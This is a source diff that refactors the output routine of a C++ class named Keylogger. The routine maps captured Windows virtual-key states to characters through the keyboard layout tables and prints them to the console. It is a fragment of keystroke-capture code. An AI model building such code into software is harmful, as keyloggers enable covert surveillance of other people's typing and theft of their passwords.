@@ -32,8 +32,8 @@ void Keylogger::setKeysState() {
 	}
 }
 void Keylogger::handleOutput() {
-	auto& keys = getKeys();
-	auto& keysLayoutOuter = layout->pVkToWcharTable;
+	const auto& keys = getKeys();
+	const auto& keysLayout = getKeysLayout();
 
 	bool caps = keys[VK_CAPITAL].isToggled();
 	bool shift = keys[VK_SHIFT].isPressed();
@@ -42,40 +42,36 @@ void Keylogger::handleOutput() {
 	bool alt = keys[VK_MENU].isPressed();
 	bool altgr = ctrl && alt;
 	
-	for (int j = 0; keysLayoutOuter[j].pVkToWchars; j++) {
-		auto& keysLayout = keysLayoutOuter[j];
+	for (int i = 0; i < keysLayout.size(); i++) {
+		const auto& keyLayout = keysLayout[i];
+		const auto& key = keys[keyLayout.VirtualKey];
 
-		for (auto keyLayout = keysLayout.pVkToWchars; 
-			keyLayout->VirtualKey; 
-			keyLayout = (VK_TO_WCHARS1*)(((PBYTE)keyLayout) + keysLayout.cbSize))
+		if (!key.isAlternating() || !key.isPressed() ||
+			key.value == VK_RETURN || key.value == VK_BACK ||
+			key.value == VK_TAB)
 		{
-			const auto& key = keys[keyLayout->VirtualKey];
-
-			if (!key.isAlternating() || !key.isPressed() || 
-				key.value == VK_RETURN || key.value == VK_BACK || 
-				key.value == VK_TAB)
-			{
-				continue;
-			}
-
-			if (altgr) {
-				if (keysLayout.nModifications >= 4 && ((keyLayout->Attributes & CAPLOKALTGR && upper) || shift)) {
-					std::wcout << keyLayout->wch[3];
-				}
-				else if (keysLayout.nModifications >= 3 && !shift) {
-					std::wcout << keyLayout->wch[2];
-				}
-			}
-			else {
-				if (keysLayout.nModifications >= 2 && ((keyLayout->Attributes & CAPLOK && upper) || shift)) {
-					std::wcout << keyLayout->wch[1];
-				}
-				else {
-					std::wcout << keyLayout->wch[0];
-				}
-			}
-			std::wcout.clear();
+			continue;
 		}
+
+		if (altgr) {
+			if (keyLayout.wch[3] && ((keyLayout.Attributes & CAPLOKALTGR && upper) || shift)) {
+
+				std::wcout << keyLayout.wch[3];
+			}
+			if (keyLayout.wch[2] && !shift) {
+				std::wcout << keyLayout.wch[2];
+			}
+		}
+		if (!altgr) {
+			if (keyLayout.wch[1] && ((keyLayout.Attributes & CAPLOK && upper) || shift)) {
+				std::wcout << keyLayout.wch[1];
+			}
+			if (keyLayout.wch[0] && !shift) {
+				std::wcout << keyLayout.wch[0];
+			}
+		}
+		std::wcout.clear();
 	}
+	
 }
 
